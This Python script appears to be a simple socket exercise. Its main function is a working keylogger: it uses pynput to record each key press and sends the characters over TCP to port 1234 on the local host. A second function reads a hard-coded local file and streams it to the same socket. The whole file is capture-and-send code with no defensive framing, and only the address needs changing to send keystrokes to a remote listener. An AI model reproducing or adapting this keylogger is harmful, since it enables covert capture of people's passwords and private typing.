import socket
import my_protocol
import pynput
from pynput.keyboard import Key, Listener

global clientSocket
def on_press(key):
    global clientSocket
    print('{} - Pressed'.format(key))
    if hasattr(key, 'vk'):
        clientSocket.send(my_protocol.data_to_nbyte(key.char))

def on_release(key):
    pass   

def send_msg():
    global clientSocket
    # (IP4, TCP)
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # return tuple (server IP, port)
    clientSocket.connect((socket.gethostname(), 1234,))

    with Listener(on_press=on_press, on_release=on_release) as listener:        
        listener.join()
        # clientSocket.send(my_protocol.data_to_nbyte(456987132))

    # data = clientSocket.recv(1024)

    # print('recive:', data)

    clientSocket.close()

def send_file():
    # (IP4, TCP)
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # return tuple (server IP, port)
    clientSocket.connect((socket.gethostname(), 1234,))

    fp = open(r'D:\pyCharm\Pixiv.py', 'rb')
    
    while True:

        data = fp.read(16)

        if not data:
            break
        
        clientSocket.send(data)

    fp.close()
    clientSocket.close()

if __name__ == "__main__":
    send_msg()

    # send_file()